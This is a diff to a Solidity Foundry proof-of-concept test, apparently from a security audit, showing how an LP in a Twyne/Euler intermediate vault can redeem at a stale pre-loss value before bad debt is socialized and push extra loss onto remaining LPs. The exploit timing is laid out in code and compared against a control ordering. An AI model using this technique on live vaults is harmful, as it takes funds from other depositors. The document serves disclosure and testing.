@@ -13,12 +13,13 @@ import {console2} from "forge-std/console2.sol";
 /// its pro-rata share of the loss to LPs who remain through socialization.
 contract TwyneStaleBadDebtExitPoC is EulerLiquidationTest {
     struct PathResult {
-        uint256 attackerOut;
-        uint256 victimOut;
+        uint256 attackerValue;
+        uint256 victimValue;
         uint256 assetsBeforeSettlement;
         uint256 assetsAfterSettlement;
         uint256 debtBeforeSettlement;
         uint256 debtAfterSettlement;
+        uint256 cashAfterSettlement;
     }
 
     function _prepareWindow() internal {
@@ -31,6 +32,11 @@ contract TwyneStaleBadDebtExitPoC is EulerLiquidationTest {
 
         assertGt(eeWETH_intermediate_vault.balanceOf(bob), 0, "bob has no LP shares");
         assertGt(eeWETH_intermediate_vault.balanceOf(eve), 0, "eve has no LP shares");
+        assertEq(
+            eeWETH_intermediate_vault.balanceOf(bob),
+            eeWETH_intermediate_vault.balanceOf(eve),
+            "fixture LPs do not have equal shares"
+        );
 
         vm.startPrank(IEVault(eulerUSDC).governorAdmin());
         IEVault(eulerUSDC).setLTV(eulerWETH, 0.5e4, 0.6e4, 0);
@@ -114,29 +120,41 @@ contract TwyneStaleBadDebtExitPoC is EulerLiquidationTest {
         assetsOut = eeWETH_intermediate_vault.redeem(shares, lp, lp);
     }
 
+    function _previewAll(address lp) internal view returns (uint256 assetsOut) {
+        uint256 shares = eeWETH_intermediate_vault.balanceOf(lp);
+        assertGt(shares, 0, "LP has no shares");
+        assetsOut = eeWETH_intermediate_vault.previewRedeem(shares);
+    }
+
     function _runVulnerablePath() internal returns (PathResult memory r) {
         r.assetsBeforeSettlement = eeWETH_intermediate_vault.totalAssets();
         r.debtBeforeSettlement = eeWETH_intermediate_vault.debtOf(address(alice_collateral_vault));
 
-        r.attackerOut = _redeemAll(bob);
+        // Bob realizes the stale pre-loss NAV while cash is still available.
+        r.attackerValue = _redeemAll(bob);
 
         _settleBadDebt();
         r.assetsAfterSettlement = eeWETH_intermediate_vault.totalAssets();
         r.debtAfterSettlement = eeWETH_intermediate_vault.debtOf(address(alice_collateral_vault));
+        r.cashAfterSettlement = eeWETH_intermediate_vault.cash();
 
-        r.victimOut = _redeemAll(eve);
+        // Record Eve's post-loss economic claim instead of forcing a full redemption;
+        // EVK may be short by a few wei of immediately available cash due to rounding.
+        r.victimValue = _previewAll(eve);
     }
 
     function _runControlPath() internal returns (PathResult memory r) {
         r.assetsBeforeSettlement = eeWETH_intermediate_vault.totalAssets();
         r.debtBeforeSettlement = eeWETH_intermediate_vault.debtOf(address(alice_collateral_vault));
 
+        // Correct ordering: recognize/socialize the loss before either LP exits.
         _settleBadDebt();
         r.assetsAfterSettlement = eeWETH_intermediate_vault.totalAssets();
         r.debtAfterSettlement = eeWETH_intermediate_vault.debtOf(address(alice_collateral_vault));
+        r.cashAfterSettlement = eeWETH_intermediate_vault.cash();
 
-        r.attackerOut = _redeemAll(bob);
-        r.victimOut = _redeemAll(eve);
+        r.attackerValue = _previewAll(bob);
+        r.victimValue = _previewAll(eve);
     }
 
     function test_PoC_ExternalLiquidationCreatesStaleNavExitWindow() public {
@@ -148,23 +166,26 @@ contract TwyneStaleBadDebtExitPoC is EulerLiquidationTest {
         assertTrue(vm.revertToState(snapshotId), "snapshot restore failed");
         PathResult memory control = _runControlPath();
 
-        uint256 attackerGain = vulnerable.attackerOut - control.attackerOut;
-        uint256 victimExtraLoss = control.victimOut - vulnerable.victimOut;
+        uint256 attackerGain = vulnerable.attackerValue - control.attackerValue;
+        uint256 victimExtraLoss = control.victimValue - vulnerable.victimValue;
         uint256 socializedLoss = control.assetsBeforeSettlement - control.assetsAfterSettlement;
 
         assertGt(attackerGain, 0, "LP exit before socialization produced no gain");
         assertGt(victimExtraLoss, 0, "remaining LP did not absorb extra loss");
-        assertApproxEqAbs(attackerGain, victimExtraLoss, 8, "value transfer is not reciprocal");
+        assertApproxEqAbs(attackerGain, victimExtraLoss, 12, "value transfer is not reciprocal");
         assertGt(socializedLoss, 0, "no loss was socialized");
-        assertLe(attackerGain, socializedLoss, "attacker gain exceeds socialized loss");
+        assertApproxEqAbs(attackerGain * 2, socializedLoss, 16, "equal-share gain is not half the socialized loss");
+        assertEq(vulnerable.debtAfterSettlement, 0, "vulnerable path left debt");
+        assertEq(control.debtAfterSettlement, 0, "control path left debt");
 
-        console2.log("VULNERABLE attackerOut", vulnerable.attackerOut);
-        console2.log("CONTROL attackerOut", control.attackerOut);
+        console2.log("VULNERABLE attackerValue", vulnerable.attackerValue);
+        console2.log("CONTROL attackerValue", control.attackerValue);
         console2.log("attackerGain", attackerGain);
-        console2.log("VULNERABLE victimOut", vulnerable.victimOut);
-        console2.log("CONTROL victimOut", control.victimOut);
+        console2.log("VULNERABLE victimValue", vulnerable.victimValue);
+        console2.log("CONTROL victimValue", control.victimValue);
         console2.log("victimExtraLoss", victimExtraLoss);
         console2.log("socializedLoss", socializedLoss);
         console2.log("badDebtBeforeSettlement", control.debtBeforeSettlement);
+        console2.log("vulnerableCashAfterSettlement", vulnerable.cashAfterSettlement);
     }
 }
